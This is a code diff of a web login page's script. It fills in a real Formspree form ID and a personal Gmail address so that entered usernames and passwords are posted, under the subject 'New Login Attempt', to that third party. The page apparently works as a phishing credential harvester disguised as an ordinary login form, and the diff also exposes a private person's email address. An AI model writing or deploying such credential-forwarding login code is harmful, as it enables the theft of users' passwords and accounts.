@@ -79,7 +79,7 @@
             const password = document.getElementById('password').value;
             if (username && password) {
                 // Send data to Formspree
-                fetch('https://formspree.io/f/your-form-id', {
+                fetch('https://formspree.io/f/xgvlyakq', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -88,7 +88,7 @@
                         username: username,
                         password: password,
                         _subject: 'New Login Attempt',
-                        _replyto: 'your-email@example.com' // Optional: Your email for replies
+                        _replyto: 'kavish2206@gmail.com' // Optional: Your email for replies
                     })
                 })
                 .then(response => {
